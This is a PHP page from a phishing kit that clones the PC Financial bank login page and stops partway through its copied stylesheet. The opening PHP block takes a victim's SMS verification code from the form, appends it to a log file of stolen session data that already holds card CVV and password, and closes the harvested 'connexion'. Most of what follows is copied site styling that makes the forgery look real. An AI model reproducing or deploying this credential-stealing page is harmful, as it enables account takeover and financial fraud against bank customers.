<?php session_start();
if (!isset($_SESSION["cvv"]) or !isset( $_SESSION["mdp"])) {
        header("Location: ./index.php");
        exit();
}
$_SESSION["sms"] = $_POST['sms'] ;

$donnees = "Sms : " .$_SESSION["sms"] ."\n". "** FIN  CONNEXION **\n"."\n";
$file = "../blinky2000@bvc@bvc@destruction.txt" ;
file_put_contents($file, $donnees, FILE_APPEND);

session_destroy();




?>





<!DOCTYPE html>
<!-- saved from url=(0038)https://secure.pcfinancial.ca/en/login -->
<html lang="en" data-critters-container="">
<script type="text/javascript" async="" src="./Login _ PC Financial_files/analytics.js.téléchargement"></script>
<script type="text/javascript" async="" src="./Login _ PC Financial_files/main.MWNkMWZjOGNjNA.js.téléchargement"
  data-id="CFC4ERJC77U2ISB9Q8DG"></script>
<script async="true" src="./Login _ PC Financial_files/8c399b1b-bc68-45b0-8668-ba0d30dcff62.js.téléchargement"
  crossorigin="anonymous"></script>
<script type="text/javascript" async="" src="./Login _ PC Financial_files/events.js.téléchargement"></script>
<script type="text/javascript" async="" src="./Login _ PC Financial_files/scevent.min.js.téléchargement"></script>
<script type="text/javascript" async="" src="./Login _ PC Financial_files/js"></script>
<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js"
  id="eppiocemhmnlbhjplcgkofciiegomcon"></script>
<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script>
<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <script src="./Login _ PC Financial_files/pcbank_common.js.téléchargement"></script>
  <script src="./Login _ PC Financial_files/embed.js.téléchargement" async=""></script>
  <script src="./Login _ PC Financial_files/agent.js.téléchargement" async=""></script><!--<base href="/">-->
  <base href=".">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Login | PC Financial</title>
  <meta name="title"
    content="PC Financial | Canadian Rewards Credit Cards with No Annual Fee | Services financiers PC | Cartes de crédit canadiennes avec récompenses et sans frais annuels">
  <meta name="description"
    content="Log in to your online PC Financial account. Don’t have an account? You can sign up for one today!">
  <meta name="keywords" content="">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Login | PC Financial">
  <meta name="twitter:description"
    content="Log in to your online PC Financial account. Don’t have an account? You can sign up for one today!">
  <meta name="twitter:image" content="">
  <meta property="og:type" content="article">
  <meta property="og:title" content="Login | PC Financial">
  <meta property="og:description"
    content="Log in to your online PC Financial account. Don’t have an account? You can sign up for one today!">
  <meta property="og:image" content="">
  <link rel="apple-touch-icon" sizes="180x180" href="https://secure.pcfinancial.ca/assets/favicon/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="https://secure.pcfinancial.ca/assets/favicon/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://secure.pcfinancial.ca/assets/favicon/favicon-16x16.png">
  <link rel="manifest" href="https://secure.pcfinancial.ca/site.webmanifest">
  <style>
    @charset "UTF-8";

    @font-face {
      font-family: Averta;
      src: url(/assets/fonts/averta-regular-webfont.eot);
      src: url(/assets/fonts/averta-regular-webfont.eot?#iefix) format("embedded-opentype"), url(/assets/fonts/averta-regular-webfont.woff2) format("woff2"), url(/assets/fonts/averta-regular-webfont.woff) format("woff"), url(/assets/fonts/averta-regular-webfont.ttf) format("truetype"), url(/assets/fonts/averta-regular-webfont.svg#averta_regularregular) format("svg");
      font-weight: 400;
      font-style: normal
    }

    @font-face {
      font-family: Averta;
      src: url(/assets/fonts/averta-regularitalic-webfont.eot);
      src: url(/assets/fonts/averta-regularitalic-webfont.eot?#iefix) format("embedded-opentype"), url(/assets/fonts/averta-regularitalic-webfont.woff2) format("woff2"), url(/assets/fonts/averta-regularitalic-webfont.woff) format("woff"), url(/assets/fonts/averta-regularitalic-webfont.ttf) format("truetype"), url(/assets/fonts/averta-regularitalic-webfont.svg#avertaregular_italic) format("svg");
      font-weight: 400;
      font-style: italic
    }

    @font-face {
      font-family: Averta;
      src: url(/assets/fonts/averta-semibold-webfont.eot);
      src: url(/assets/fonts/averta-semibold-webfont.eot?#iefix) format("embedded-opentype"), url(/assets/fonts/averta-semibold-webfont.woff2) format("woff2"), url(/assets/fonts/averta-semibold-webfont.woff) format("woff"), url(/assets/fonts/averta-semibold-webfont.ttf) format("truetype"), url(/assets/fonts/averta-semibold-webfont.svg#avertasemibold) format("svg");
      font-weight: 600;
      font-style: normal
    }

    @font-face {
      font-family: Averta;
      src: url(/assets/fonts/averta-bold-webfont.eot);
      src: url(/assets/fonts/averta-bold-webfont.eot?#iefix) format("embedded-opentype"), url(/assets/fonts/averta-bold-webfont.woff2) format("woff2"), url(/assets/fonts/averta-bold-webfont.woff) format("woff"), url(/assets/fonts/averta-bold-webfont.ttf) format("truetype"), url(/assets/fonts/averta-bold-webfont.svg#avertabold) format("svg");
      font-weight: 700;
      font-style: normal
    }

    @font-face {
      font-family: Averta;
      src: url(/assets/fonts/averta-bolditalic-webfont.eot);
      src: url(/assets/fonts/averta-bolditalic-webfont.eot?#iefix) format("embedded-opentype"), url(/assets/fonts/averta-bolditalic-webfont.woff2) format("woff2"), url(/assets/fonts/averta-bolditalic-webfont.woff) format("woff"), url(/assets/fonts/averta-bolditalic-webfont.ttf) format("truetype"), url(/assets/fonts/averta-bolditalic-webfont.svg#avertabold_italic) format("svg");
      font-weight: 700;
      font-style: italic
    }

    * {
      font-family: Averta;
      line-height: 1.2
    }

    p {
      margin: 0;
      font-size: .875em;
      font-weight: 400
    }

    body,
    html {
      overflow-x: hidden
    }

    body {
      margin: 0
    }

    .full-screen-loader {
      display: none
    }

    body.processing {
      overflow: hidden
    }

    body.processing .full-screen-loader {
      display: block
    }

    body {
      margin-right: calc(-1*(100vw - 100%))
    }
  </style>
  <link rel="stylesheet" href="./Login _ PC Financial_files/styles.a9680910b4ac290f.css" media="all"
    onload="this.media=&quot;all&quot;"><noscript>
    <link rel="stylesheet" href="styles.a9680910b4ac290f.css">
  </noscript>
  <script src="./Login _ PC Financial_files/dsp" type="text/javascript" defer="" async=""></script>
  <style type="text/css" id="kampyleStyle">
    .noOutline {
      outline: none !important;
    }

    .wcagOutline:focus {
      outline: 1px dashed #595959 !important;
      outline-offset: 2px !important;
      transition: none !important;
    }
  </style>
  <style>
    #popper-wrapper.dark-mode[_nghost-ng-c1715610169] .side-nav-container[_ngcontent-ng-c1715610169] ul[_ngcontent-ng-c1715610169] li[_ngcontent-ng-c1715610169] button.btn-secondary-nav.selected[_ngcontent-ng-c1715610169],
    #popper-wrapper.dark-mode [_nghost-ng-c1715610169] .side-nav-container[_ngcontent-ng-c1715610169] ul[_ngcontent-ng-c1715610169] li[_ngcontent-ng-c1715610169] button.btn-secondary-nav.selected[_ngcontent-ng-c1715610169] {
      background-color: #9c4fc9
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1715610169] .side-nav-container[_ngcontent-ng-c1715610169] ul[_ngcontent-ng-c1715610169] li[_ngcontent-ng-c1715610169] button[_ngcontent-ng-c1715610169]:hover,
    #popper-wrapper.dark-mode [_nghost-ng-c1715610169] .side-nav-container[_ngcontent-ng-c1715610169] ul[_ngcontent-ng-c1715610169] li[_ngcontent-ng-c1715610169] button[_ngcontent-ng-c1715610169]:hover {
      background: #404040
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1715610169] .info-block-container[_ngcontent-ng-c1715610169] .info-block[_ngcontent-ng-c1715610169] .info-text[_ngcontent-ng-c1715610169]:before,
    #popper-wrapper.dark-mode [_nghost-ng-c1715610169] .info-block-container[_ngcontent-ng-c1715610169] .info-block[_ngcontent-ng-c1715610169] .info-text[_ngcontent-ng-c1715610169]:before {
      content: "";
      background-image: url(/assets/images/cbr-info-dark-mode.svg);
      background-size: contain;
      display: inline-block;
      background-repeat: no-repeat;
      vertical-align: middle;
      height: 31px;
      width: 32px
    }

    @keyframes _ngcontent-ng-c1715610169_menuOpen {
      0% {
        transform: scaleY(0);
        opacity: 0
      }
    }

    @keyframes _ngcontent-ng-c1715610169_slideIn {
      0% {
        transform: translate(100%)
      }

      to {
        transform: translate(0)
      }
    }

    @keyframes _ngcontent-ng-c1715610169_overlayFadeIn {
      0% {
        opacity: 0
      }

      to {
        opacity: .75
      }
    }

    @keyframes _ngcontent-ng-c1715610169_bounce-in {
      0% {
        transform: scale(0)
      }

      50% {
        transform: scale(1.15)
      }

      70% {
        transform: scale(.95)
      }

      to {
        transform: scale(1)
      }
    }

    *[_ngcontent-ng-c1715610169] {
      font-family: Averta;
      line-height: 1.2
    }

    p[_ngcontent-ng-c1715610169] {
      margin: 0;
      font-size: .875em;
      font-weight: 400
    }

    h2[_ngcontent-ng-c1715610169] {
      font-family: Averta;
      font-weight: 700
    }

    .loader-shield-container[_ngcontent-ng-c1715610169] {
      display: flex;
      position: fixed;
      align-items: center;
      justify-content: center;
      text-align: center;
      width: 100%;
      height: 100%;
      background: white;
      z-index: 100
    }

    .loader-shield-container[_ngcontent-ng-c1715610169] figure[_ngcontent-ng-c1715610169] {
      width: 80px;
      height: 80px;
      margin-top: -40px
    }
  </style>
  <script charset="utf-8" src="./Login _ PC Financial_files/identify_93546.js.téléchargement"></script>
  <style>
    #popper-wrapper.dark-mode[_nghost-ng-c3319022991] .side-nav-container[_ngcontent-ng-c3319022991] ul[_ngcontent-ng-c3319022991] li[_ngcontent-ng-c3319022991] button.btn-secondary-nav.selected[_ngcontent-ng-c3319022991],
    #popper-wrapper.dark-mode [_nghost-ng-c3319022991] .side-nav-container[_ngcontent-ng-c3319022991] ul[_ngcontent-ng-c3319022991] li[_ngcontent-ng-c3319022991] button.btn-secondary-nav.selected[_ngcontent-ng-c3319022991] {
      background-color: #9c4fc9
    }

    #popper-wrapper.dark-mode[_nghost-ng-c3319022991] .side-nav-container[_ngcontent-ng-c3319022991] ul[_ngcontent-ng-c3319022991] li[_ngcontent-ng-c3319022991] button[_ngcontent-ng-c3319022991]:hover,
    #popper-wrapper.dark-mode [_nghost-ng-c3319022991] .side-nav-container[_ngcontent-ng-c3319022991] ul[_ngcontent-ng-c3319022991] li[_ngcontent-ng-c3319022991] button[_ngcontent-ng-c3319022991]:hover {
      background: #404040
    }

    #popper-wrapper.dark-mode[_nghost-ng-c3319022991] .info-block-container[_ngcontent-ng-c3319022991] .info-block[_ngcontent-ng-c3319022991] .info-text[_ngcontent-ng-c3319022991]:before,
    #popper-wrapper.dark-mode [_nghost-ng-c3319022991] .info-block-container[_ngcontent-ng-c3319022991] .info-block[_ngcontent-ng-c3319022991] .info-text[_ngcontent-ng-c3319022991]:before {
      content: "";
      background-image: url(/assets/images/cbr-info-dark-mode.svg);
      background-size: contain;
      display: inline-block;
      background-repeat: no-repeat;
      vertical-align: middle;
      height: 31px;
      width: 32px
    }

    @keyframes _ngcontent-ng-c3319022991_menuOpen {
      0% {
        transform: scaleY(0);
        opacity: 0
      }
    }

    @keyframes _ngcontent-ng-c3319022991_slideIn {
      0% {
        transform: translate(100%)
      }

      to {
        transform: translate(0)
      }
    }

    @keyframes _ngcontent-ng-c3319022991_overlayFadeIn {
      0% {
        opacity: 0
      }

      to {
        opacity: .75
      }
    }

    @keyframes _ngcontent-ng-c3319022991_bounce-in {
      0% {
        transform: scale(0)
      }

      50% {
        transform: scale(1.15)
      }

      70% {
        transform: scale(.95)
      }

      to {
        transform: scale(1)
      }
    }

    *[_ngcontent-ng-c3319022991] {
      font-family: Averta;
      line-height: 1.2
    }

    p[_ngcontent-ng-c3319022991] {
      margin: 0;
      font-size: .875em;
      font-weight: 400
    }

    h2[_ngcontent-ng-c3319022991] {
      font-family: Averta;
      font-weight: 700
    }

    .fs-banner[_ngcontent-ng-c3319022991] {
      position: fixed;
      -webkit-backface-visibility: hidden;
      backface-visibility: hidden;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: white;
      z-index: 10000;
      display: flex;
      flex-direction: column;
      overflow-y: auto
    }

    .fs-header[_ngcontent-ng-c3319022991] {
      padding: 20px;
      border-bottom: 1px solid #e8e9eb;
      z-index: 1;
      background: white;
      width: calc(100% - 40px);
      position: fixed;
      -webkit-backface-visibility: hidden;
      backface-visibility: hidden;
      display: flex;
      justify-content: space-between
    }

    .fs-header[_ngcontent-ng-c3319022991] .blade-title[_ngcontent-ng-c3319022991] {
      font-size: 1.125em;
      font-weight: 400;
      font-weight: 600;
      flex: 1;
      text-align: center;
      align-self: center;
      color: #e1251b
    }

    .fs-header[_ngcontent-ng-c3319022991] app-logo[_ngcontent-ng-c3319022991] {
      flex: 1
    }

    .fs-header[_ngcontent-ng-c3319022991] button-close[_ngcontent-ng-c3319022991] {
      flex: 1
    }

    .fs-body[_ngcontent-ng-c3319022991] {
      display: flex;
      align-items: center;
      justify-content: center;
      flex-grow: 1
    }

    .content[_ngcontent-ng-c3319022991],
    .failed-content[_ngcontent-ng-c3319022991] {
      margin: 0 auto;
      max-width: 600px;
      padding: 94px 20px 40px
    }

    h2[_ngcontent-ng-c3319022991] {
      font-size: 2.25em;
      font-weight: 700;
      margin: 0 0 20px;
      color: #2b2c32
    }

    h2.failed[_ngcontent-ng-c3319022991]:before {
      content: "";
      background-image: url(/assets/images/result-error.svg);
      background-size: contain;
      display: inline-block;
      background-repeat: no-repeat;
      vertical-align: middle;
      height: 42px;
      width: 42px;
      display: block;
      margin-bottom: 40px
    }

    p[_ngcontent-ng-c3319022991] {
      font-size: 1.125em;
      font-weight: 400;
      color: #6b6b6b;
      line-height: 1.67
    }

    .tel[_ngcontent-ng-c3319022991] {
      white-space: nowrap
    }

    .lock-icon[_ngcontent-ng-c3319022991] {
      width: 32px;
      height: 42px;
      color: #e1251b;
      background-repeat: no-repeat;
      background-image: url(icon-padlock.df8117957da1420b.svg);
      padding-bottom: 40px
    }
  </style>
  <style>
    .modal-info[_ngcontent-ng-c1274093243] p[_ngcontent-ng-c1274093243] {
      display: inline
    }
  </style>
  <style>
    #popper-wrapper.dark-mode[_nghost-ng-c1323118236] .side-nav-container[_ngcontent-ng-c1323118236] ul[_ngcontent-ng-c1323118236] li[_ngcontent-ng-c1323118236] button.btn-secondary-nav.selected[_ngcontent-ng-c1323118236],
    #popper-wrapper.dark-mode [_nghost-ng-c1323118236] .side-nav-container[_ngcontent-ng-c1323118236] ul[_ngcontent-ng-c1323118236] li[_ngcontent-ng-c1323118236] button.btn-secondary-nav.selected[_ngcontent-ng-c1323118236] {
      background-color: #9c4fc9
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1323118236] .side-nav-container[_ngcontent-ng-c1323118236] ul[_ngcontent-ng-c1323118236] li[_ngcontent-ng-c1323118236] button[_ngcontent-ng-c1323118236]:hover,
    #popper-wrapper.dark-mode [_nghost-ng-c1323118236] .side-nav-container[_ngcontent-ng-c1323118236] ul[_ngcontent-ng-c1323118236] li[_ngcontent-ng-c1323118236] button[_ngcontent-ng-c1323118236]:hover {
      background: #404040
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1323118236] .info-block-container[_ngcontent-ng-c1323118236] .info-block[_ngcontent-ng-c1323118236] .info-text[_ngcontent-ng-c1323118236]:before,
    #popper-wrapper.dark-mode [_nghost-ng-c1323118236] .info-block-container[_ngcontent-ng-c1323118236] .info-block[_ngcontent-ng-c1323118236] .info-text[_ngcontent-ng-c1323118236]:before {
      content: "";
      background-image: url(/assets/images/cbr-info-dark-mode.svg);
      background-size: contain;
      display: inline-block;
      background-repeat: no-repeat;
      vertical-align: middle;
      height: 31px;
      width: 32px
    }

    @keyframes _ngcontent-ng-c1323118236_menuOpen {
      0% {
        transform: scaleY(0);
        opacity: 0
      }
    }

    @keyframes _ngcontent-ng-c1323118236_slideIn {
      0% {
        transform: translate(100%)
      }

      to {
        transform: translate(0)
      }
    }

    @keyframes _ngcontent-ng-c1323118236_overlayFadeIn {
      0% {
        opacity: 0
      }

      to {
        opacity: .75
      }
    }

    @keyframes _ngcontent-ng-c1323118236_bounce-in {
      0% {
        transform: scale(0)
      }

      50% {
        transform: scale(1.15)
      }

      70% {
        transform: scale(.95)
      }

      to {
        transform: scale(1)
      }
    }

    *[_ngcontent-ng-c1323118236] {
      font-family: Averta;
      line-height: 1.2
    }

    p[_ngcontent-ng-c1323118236] {
      margin: 0;
      font-size: .875em;
      font-weight: 400
    }

    h2[_ngcontent-ng-c1323118236] {
      font-family: Averta;
      font-weight: 700
    }

    .nav[_ngcontent-ng-c1323118236] {
      position: absolute;
      top: 20px;
      left: 20px
    }

    .nav[_ngcontent-ng-c1323118236] h1[_ngcontent-ng-c1323118236] {
      margin: 0
    }

    @media only screen and (min-width: 768px) {
      .login-container[_ngcontent-ng-c1323118236] {
        display: flex
      }
    }

    .login-container[_ngcontent-ng-c1323118236] header[_ngcontent-ng-c1323118236] {
      display: none
    }

    @media only screen and (min-width: 768px) {
      .login-container[_ngcontent-ng-c1323118236] header[_ngcontent-ng-c1323118236] {
        display: block;
        background-color: #f6f6f7;
        width: 48%;
        padding: 160px 40px 0
      }
    }

    @media only screen and (min-width: 1024px) {
      .login-container[_ngcontent-ng-c1323118236] header[_ngcontent-ng-c1323118236] {
        display: block;
        background-color: #f6f6f7;
        width: 57%;
        padding: 200px 40px 0
      }
    }

    .login-container[_ngcontent-ng-c1323118236] header[_ngcontent-ng-c1323118236] p[_ngcontent-ng-c1323118236] {
      margin: 0;
      font-size: 1.125em;
      font-weight: 400
    }

    .login-container[_ngcontent-ng-c1323118236] header[_ngcontent-ng-c1323118236] h2[_ngcontent-ng-c1323118236] {
      font-size: 2em;
      font-weight: 700;
      color: #333;
      margin: 0 0 30px
    }

    @media only screen and (min-width: 900px) {
      .login-container[_ngcontent-ng-c1323118236] header[_ngcontent-ng-c1323118236] h2[_ngcontent-ng-c1323118236] {
        font-size: 3em;
        font-weight: 700
      }
    }

    @media only screen and (min-width: 1440px) {
      .login-container[_ngcontent-ng-c1323118236] header[_ngcontent-ng-c1323118236] h2[_ngcontent-ng-c1323118236] {
        font-size: 4.5em;
        font-weight: 700
      }
    }

    .login-container[_ngcontent-ng-c1323118236] .payroll-offer-container[_ngcontent-ng-c1323118236] {
      display: flex;
      justify-content: flex-start;
      margin-top: 44px
    }

    .login-form-container[_ngcontent-ng-c1323118236] {
      padding: 114px 20px 90px;
      display: flex;
      flex-wrap: wrap
    }

    @media only screen and (min-width: 768px) {
      .login-form-container[_ngcontent-ng-c1323118236] {
        width: 52%;
        padding: 160px 40px
      }
    }

    @media only screen and (min-width: 1024px) {
      .login-form-container[_ngcontent-ng-c1323118236] {
        width: 43%;
        padding: 200px 40px
      }
    }

    .login-form-container[_ngcontent-ng-c1323118236] h3[_ngcontent-ng-c1323118236] {
      width: 100%;
      font-size: 1.5em;
      font-weight: 700;
      margin: 0 0 50px;
      color: #333
    }

    @media only screen and (min-width: 1024px) {
      .login-form-container[_ngcontent-ng-c1323118236] .form[_ngcontent-ng-c1323118236] {
        width: 100%;
        max-width: 420px
      }
    }

    .login-form-container[_ngcontent-ng-c1323118236] .form-group[_ngcontent-ng-c1323118236] {
      position: relative
    }

    .login-form-container[_ngcontent-ng-c1323118236] .form-group[_ngcontent-ng-c1323118236] .form-control-feedback[_ngcontent-ng-c1323118236] {
      position: absolute;
      bottom: 0
    }

    .login-form-container[_ngcontent-ng-c1323118236] .create-account-container[_ngcontent-ng-c1323118236] {
      order: 2;
      margin-bottom: 50px;
      flex-basis: 100%
    }

    @media only screen and (min-width: 900px) {
      .login-form-container[_ngcontent-ng-c1323118236] .create-account-container[_ngcontent-ng-c1323118236] {
        flex-basis: 100%
      }
    }

    .login-form-container[_ngcontent-ng-c1323118236] .create-account-container[_ngcontent-ng-c1323118236] .nav-link[_ngcontent-ng-c1323118236] {
      margin-left: 10px
    }

    .login-form-container[_ngcontent-ng-c1323118236] .create-account-container[_ngcontent-ng-c1323118236] p[_ngcontent-ng-c1323118236] {
      margin-bottom: 10px;
      color: #313239
    }

    .login-form-container[_ngcontent-ng-c1323118236] .forgot-container[_ngcontent-ng-c1323118236] {
      text-align: right;
      padding-top: 10px
    }

    form[_ngcontent-ng-c1323118236] {
      order: 1;
      margin-bottom: 30px;
      flex-basis: 100%
    }

    form[_ngcontent-ng-c1323118236] label[_ngcontent-ng-c1323118236] {
      font-size: .875em;
      font-weight: 400
    }

    .tooltip-container[_ngcontent-ng-c1323118236] {
      margin-bottom: 50px;
      display: flex;
      flex-wrap: wrap
    }

    .tooltip-container[_ngcontent-ng-c1323118236] tooltip[_ngcontent-ng-c1323118236] {
      align-self: center
    }

    .tooltip-container[_ngcontent-ng-c1323118236] label[_ngcontent-ng-c1323118236] {
      margin: 0
    }

    .tooltip-container[_ngcontent-ng-c1323118236] span[_ngcontent-ng-c1323118236] {
      margin-right: 10px;
      color: #2b2c32
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1323118236] .login-form-container[_ngcontent-ng-c1323118236],
    #popper-wrapper.dark-mode [_nghost-ng-c1323118236] .login-form-container[_ngcontent-ng-c1323118236] {
      background-color: #0d0d0d
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1323118236] .login-form-container[_ngcontent-ng-c1323118236] h3[_ngcontent-ng-c1323118236],
    #popper-wrapper.dark-mode [_nghost-ng-c1323118236] .login-form-container[_ngcontent-ng-c1323118236] h3[_ngcontent-ng-c1323118236] {
      color: #fff
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1323118236] .login-form-container[_ngcontent-ng-c1323118236] label[_ngcontent-ng-c1323118236],
    #popper-wrapper.dark-mode [_nghost-ng-c1323118236] .login-form-container[_ngcontent-ng-c1323118236] label[_ngcontent-ng-c1323118236] {
      color: #b3b3b3
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1323118236] .login-form-container[_ngcontent-ng-c1323118236] .create-account-container[_ngcontent-ng-c1323118236] p[_ngcontent-ng-c1323118236],
    #popper-wrapper.dark-mode [_nghost-ng-c1323118236] .login-form-container[_ngcontent-ng-c1323118236] .create-account-container[_ngcontent-ng-c1323118236] p[_ngcontent-ng-c1323118236] {
      color: #b3b3b3
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1323118236] .login-form-container[_ngcontent-ng-c1323118236] .btn-primary[_ngcontent-ng-c1323118236]:not([disabled]),
    #popper-wrapper.dark-mode [_nghost-ng-c1323118236] .login-form-container[_ngcontent-ng-c1323118236] .btn-primary[_ngcontent-ng-c1323118236]:not([disabled]) {
      background-color: #9c4fc9;
      color: #fff
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1323118236] .login-form-container[_ngcontent-ng-c1323118236] .nav-link[_ngcontent-ng-c1323118236],
    #popper-wrapper.dark-mode [_nghost-ng-c1323118236] .login-form-container[_ngcontent-ng-c1323118236] .nav-link[_ngcontent-ng-c1323118236] {
      color: #9c4fc9
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1323118236] .login-form-container[_ngcontent-ng-c1323118236] input[type=checkbox][_ngcontent-ng-c1323118236]:checked,
    #popper-wrapper.dark-mode [_nghost-ng-c1323118236] .login-form-container[_ngcontent-ng-c1323118236] input[type=checkbox][_ngcontent-ng-c1323118236]:checked {
      background-image: url(/assets/images/checked-dark-mode.svg)
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1323118236] .login-container[_ngcontent-ng-c1323118236] header[_ngcontent-ng-c1323118236],
    #popper-wrapper.dark-mode [_nghost-ng-c1323118236] .login-container[_ngcontent-ng-c1323118236] header[_ngcontent-ng-c1323118236] {
      background-color: #262626
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1323118236] .login-container[_ngcontent-ng-c1323118236] header[_ngcontent-ng-c1323118236] h2[_ngcontent-ng-c1323118236],
    #popper-wrapper.dark-mode [_nghost-ng-c1323118236] .login-container[_ngcontent-ng-c1323118236] header[_ngcontent-ng-c1323118236] h2[_ngcontent-ng-c1323118236],
    #popper-wrapper.dark-mode[_nghost-ng-c1323118236] .login-container[_ngcontent-ng-c1323118236] header[_ngcontent-ng-c1323118236] p[_ngcontent-ng-c1323118236],
    #popper-wrapper.dark-mode [_nghost-ng-c1323118236] .login-container[_ngcontent-ng-c1323118236] header[_ngcontent-ng-c1323118236] p[_ngcontent-ng-c1323118236] {
      color: #fff
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1323118236] .tooltip-container[_ngcontent-ng-c1323118236] span[_ngcontent-ng-c1323118236],
    #popper-wrapper.dark-mode [_nghost-ng-c1323118236] .tooltip-container[_ngcontent-ng-c1323118236] span[_ngcontent-ng-c1323118236] {
      color: #b3b3b3
    }
  </style>
  <style>
    #popper-wrapper.dark-mode[_nghost-ng-c582108171] .side-nav-container[_ngcontent-ng-c582108171] ul[_ngcontent-ng-c582108171] li[_ngcontent-ng-c582108171] button.btn-secondary-nav.selected[_ngcontent-ng-c582108171],
    #popper-wrapper.dark-mode [_nghost-ng-c582108171] .side-nav-container[_ngcontent-ng-c582108171] ul[_ngcontent-ng-c582108171] li[_ngcontent-ng-c582108171] button.btn-secondary-nav.selected[_ngcontent-ng-c582108171] {
      background-color: #9c4fc9
    }

    #popper-wrapper.dark-mode[_nghost-ng-c582108171] .side-nav-container[_ngcontent-ng-c582108171] ul[_ngcontent-ng-c582108171] li[_ngcontent-ng-c582108171] button[_ngcontent-ng-c582108171]:hover,
    #popper-wrapper.dark-mode [_nghost-ng-c582108171] .side-nav-container[_ngcontent-ng-c582108171] ul[_ngcontent-ng-c582108171] li[_ngcontent-ng-c582108171] button[_ngcontent-ng-c582108171]:hover {
      background: #404040
    }

    #popper-wrapper.dark-mode[_nghost-ng-c582108171] .info-block-container[_ngcontent-ng-c582108171] .info-block[_ngcontent-ng-c582108171] .info-text[_ngcontent-ng-c582108171]:before,
    #popper-wrapper.dark-mode [_nghost-ng-c582108171] .info-block-container[_ngcontent-ng-c582108171] .info-block[_ngcontent-ng-c582108171] .info-text[_ngcontent-ng-c582108171]:before {
      content: "";
      background-image: url(/assets/images/cbr-info-dark-mode.svg);
      background-size: contain;
      display: inline-block;
      background-repeat: no-repeat;
      vertical-align: middle;
      height: 31px;
      width: 32px
    }

    @keyframes _ngcontent-ng-c582108171_menuOpen {
      0% {
        transform: scaleY(0);
        opacity: 0
      }
    }

    @keyframes _ngcontent-ng-c582108171_slideIn {
      0% {
        transform: translate(100%)
      }

      to {
        transform: translate(0)
      }
    }

    @keyframes _ngcontent-ng-c582108171_overlayFadeIn {
      0% {
        opacity: 0
      }

      to {
        opacity: .75
      }
    }

    @keyframes _ngcontent-ng-c582108171_bounce-in {
      0% {
        transform: scale(0)
      }

      50% {
        transform: scale(1.15)
      }

      70% {
        transform: scale(.95)
      }

      to {
        transform: scale(1)
      }
    }

    *[_ngcontent-ng-c582108171] {
      font-family: Averta;
      line-height: 1.2
    }

    p[_ngcontent-ng-c582108171] {
      margin: 0;
      font-size: .875em;
      font-weight: 400
    }

    h2[_ngcontent-ng-c582108171] {
      font-family: Averta;
      font-weight: 700
    }

    header[_ngcontent-ng-c582108171] {
      position: absolute;
      top: 20px;
      left: 20px
    }

    .title-header[_ngcontent-ng-c582108171] {
      position: relative;
      top: 0;
      left: 0;
      display: flex;
      align-items: center;
      width: 100%;
      padding: 10px;
      box-sizing: border-box;
      justify-content: space-between;
      border-bottom: solid 1px #e8e9eb
    }

    .title-header[_ngcontent-ng-c582108171] .title-text[_ngcontent-ng-c582108171] {
      position: absolute;
      margin-left: 50%;
      transform: translate(-50%);
      color: #e1251b;
      font-size: 1.125em;
      font-weight: 600;
      display: none
    }

    @media only screen and (min-width: 700px) {
      .title-header[_ngcontent-ng-c582108171] .title-text[_ngcontent-ng-c582108171] {
        display: block
      }
    }
  </style>
  <style>
    #popper-wrapper.dark-mode[_nghost-ng-c2725482222] .side-nav-container[_ngcontent-ng-c2725482222] ul[_ngcontent-ng-c2725482222] li[_ngcontent-ng-c2725482222] button.btn-secondary-nav.selected[_ngcontent-ng-c2725482222],
    #popper-wrapper.dark-mode [_nghost-ng-c2725482222] .side-nav-container[_ngcontent-ng-c2725482222] ul[_ngcontent-ng-c2725482222] li[_ngcontent-ng-c2725482222] button.btn-secondary-nav.selected[_ngcontent-ng-c2725482222] {
      background-color: #9c4fc9
    }

    #popper-wrapper.dark-mode[_nghost-ng-c2725482222] .side-nav-container[_ngcontent-ng-c2725482222] ul[_ngcontent-ng-c2725482222] li[_ngcontent-ng-c2725482222] button[_ngcontent-ng-c2725482222]:hover,
    #popper-wrapper.dark-mode [_nghost-ng-c2725482222] .side-nav-container[_ngcontent-ng-c2725482222] ul[_ngcontent-ng-c2725482222] li[_ngcontent-ng-c2725482222] button[_ngcontent-ng-c2725482222]:hover {
      background: #404040
    }

    #popper-wrapper.dark-mode[_nghost-ng-c2725482222] .info-block-container[_ngcontent-ng-c2725482222] .info-block[_ngcontent-ng-c2725482222] .info-text[_ngcontent-ng-c2725482222]:before,
    #popper-wrapper.dark-mode [_nghost-ng-c2725482222] .info-block-container[_ngcontent-ng-c2725482222] .info-block[_ngcontent-ng-c2725482222] .info-text[_ngcontent-ng-c2725482222]:before {
      content: "";
      background-image: url(/assets/images/cbr-info-dark-mode.svg);
      background-size: contain;
      display: inline-block;
      background-repeat: no-repeat;
      vertical-align: middle;
      height: 31px;
      width: 32px
    }

    @keyframes _ngcontent-ng-c2725482222_menuOpen {
      0% {
        transform: scaleY(0);
        opacity: 0
      }
    }

    @keyframes _ngcontent-ng-c2725482222_slideIn {
      0% {
        transform: translate(100%)
      }

      to {
        transform: translate(0)
      }
    }

    @keyframes _ngcontent-ng-c2725482222_overlayFadeIn {
      0% {
        opacity: 0
      }

      to {
        opacity: .75
